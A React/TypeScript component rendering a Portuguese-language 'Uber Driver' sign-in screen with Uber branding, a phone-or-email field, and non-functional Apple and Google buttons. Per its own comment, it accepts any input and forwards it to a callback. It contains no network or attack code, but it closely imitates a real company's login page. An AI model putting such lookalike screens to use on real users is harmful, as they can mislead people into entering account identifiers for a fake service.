
import React, { useState } from 'react';

interface LoginProps {
  onContinue: (identifier: string) => void;
  onFindAccount?: () => void;
}

const Login: React.FC<LoginProps> = ({ onContinue, onFindAccount }) => {
  const [input, setInput] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Sempre continua, independente do que foi digitado
    onContinue(input);
  };

  return (
    <div className="h-full bg-white flex flex-col px-6 pt-8 pb-6 text-black overflow-y-auto font-sans">
      {/* Logo */}
      <div className="flex justify-center mb-6">
        <div className="bg-black text-white p-2 rounded-xl flex flex-col items-center justify-center w-16 h-16 shadow-md">
          <span className="text-lg font-bold leading-none">Uber</span>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="mt-0.5">
            <path d="M5 12H19M19 12L13 6M19 12L13 18" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
      </div>

      {/* Title */}
      <h1 className="text-[24px] font-bold text-center leading-tight mb-6">
        Comece a usar o App Uber Driver
      </h1>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-3">
        <div>
          <label className="block text-sm font-medium mb-1.5">Celular ou e-mail</label>
          <div className="relative">
            <input
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Informar telefone ou e-mail"
              className="w-full bg-[#EEEEEE] border-none rounded-lg py-3 px-4 pr-12 text-base focus:outline-none focus:ring-2 focus:ring-black transition-all"
            />
            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-600">
              <i className="fa-solid fa-user-plus text-lg"></i>
            </div>
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-black text-white font-bold py-3.5 rounded-lg text-base hover:bg-zinc-800 transition-colors mt-1 active:scale-[0.98]"
        >
          Continuar
        </button>
      </form>

      {/* Divider */}
      <div className="flex items-center gap-4 my-4">
        <div className="flex-1 h-[1px] bg-gray-300"></div>
        <span className="text-gray-500 text-xs">ou</span>
        <div className="flex-1 h-[1px] bg-gray-300"></div>
      </div>

      {/* Social Buttons */}
      <div className="space-y-2.5">
        <button type="button" className="w-full bg-[#EEEEEE] text-black font-semibold py-3 rounded-lg flex items-center justify-center gap-3 text-sm active:scale-[0.98]">
          <i className="fa-brands fa-apple text-xl"></i>
          Continuar com a Apple
        </button>
        <button type="button" className="w-full bg-[#EEEEEE] text-black font-semibold py-3 rounded-lg flex items-center justify-center gap-3 text-sm active:scale-[0.98]">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" className="w-4 h-4">
            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24s8.955,20,20,20s20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
          </svg>
          Continuar com o Google
        </button>
      </div>

      {/* Divider */}
      <div className="flex items-center gap-4 my-4">
        <div className="flex-1 h-[1px] bg-gray-300"></div>
        <span className="text-gray-500 text-xs">ou</span>
        <div className="flex-1 h-[1px] bg-gray-300"></div>
      </div>

      {/* Find Account */}
      <button 
        type="button" 
        onClick={onFindAccount}
        className="flex items-center justify-center gap-3 text-black font-semibold py-1.5 text-sm hover:opacity-70 transition-opacity"
      >
        <i className="fa-solid fa-magnifying-glass text-base"></i>
        Encontrar minha conta
      </button>

      {/* Footer Text */}
      <p className="text-[11px] text-gray-500 mt-6 text-left leading-relaxed">
        Ao continuar, você concorda com chamadas, inclusive por discagem automática, WhatsApp ou mensagens de texto da Uber e suas afiliadas.
      </p>
    </div>
  );
};

export default Login;
